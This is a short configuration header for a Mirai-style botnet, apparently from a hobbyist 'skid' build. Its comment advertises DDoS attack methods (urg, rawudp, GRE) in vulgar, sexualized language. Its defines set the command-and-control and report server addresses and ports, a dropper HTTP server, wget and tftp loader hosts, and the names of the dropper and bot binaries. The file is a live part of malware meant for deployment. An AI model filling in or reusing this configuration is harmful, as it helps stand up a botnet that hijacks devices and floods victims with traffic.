/*
bots small as your cock
methods urg, rawudp and GRE
made by root senpai's lolis
I BIG SKID
only edit down below
*/

//bot config.
#define bot_port 10019
#define rep_port 25346
#define bot_ip "1.1.1.1"
#define rep_ip "1.1.1.1"

#define ensure_single_port 12121

//dlr config.
#define HTTP_SERVER utils_inet_addr(1,1,1,1) // CHANGE TO YOUR HTTP SERVER IP

//loader config.
#define wgetip "1.1.1.1"
#define tftpip "1.1.1.1"
#define FN_DROPPER  "vretardd"
#define FN_BINARY   "miorirrmm"

